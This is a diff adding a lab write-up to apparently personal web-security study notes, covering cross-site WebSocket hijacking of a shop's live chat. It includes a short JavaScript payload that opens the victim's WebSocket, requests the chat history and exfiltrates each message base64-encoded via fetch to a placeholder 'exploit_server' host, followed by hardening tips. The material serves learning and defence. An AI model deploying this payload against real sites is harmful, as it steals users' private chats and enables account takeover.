@@ -164,3 +164,40 @@ It's not used for authentication or session handling.
 This is just for allowing cached documents (JS, CSS) to be served from other servers to speed up loading and reduce bandwidth usage.
 
 **LAB** - This shop has a live chat feature using WebSockets, use the exploit server to host html/JS payload to hijack and exfiltrate chat history the gain access to their account.
+
+*Solution*
+After initiating WebSocket connection with live chat feature we notice that the request look vulnerable to CSRF.
+Meaning it has no unpredictable or randomized tokens, except it's own session or proxy caching key.
+Additionally WebSocket on message "READY" returns chat history.
+
+With this knowledge, we can attempt to retrieve other users data by exploiting CSRF, aka hosting our own web server that will initiate the WebSockets.
+And upon receiving data we will redirect the output to our exploit server.
+
+Exploit server script:
+```javascript
+var ws = new WebSocket("wss://chat_url"); // define socket
+
+ws.onopen = function () {
+	ws.send("READY");
+};
+
+ws.onmessage = function (event) {
+	fetch("http://exploit_server?message=" + btoa(event.data)); // exfiltrate data to our server
+};
+```
+
+As you can see upon "READY" we redirect any socket response to exploit server.
+It is sent as a request with URL parameter message and base64 encoded.
+
+If we inspect or servers HTTP history the data will end up there in the URLs.
+The reason for base64 encoding is for ease of data transport in the URL, the sockets raw response is a JSON object.
+
+`btoa` - stands for binary to ascii and the reverse `atob` - ascii to binary.
+
+#### Secure a WebSocket connection
+
+- Use `wss://` (WebSocket over TLS) rather than `ws://`.
+- `Hardcode socket URL` endpoint, don't incorporate user input into the URL.
+- Protect the socket handshake against `CSRF`, avoids `socket hijacking`.
+- Treat the data from both ways as `untrusted`, handle it safely to `prevent` SQLi, XSS attacks...
+
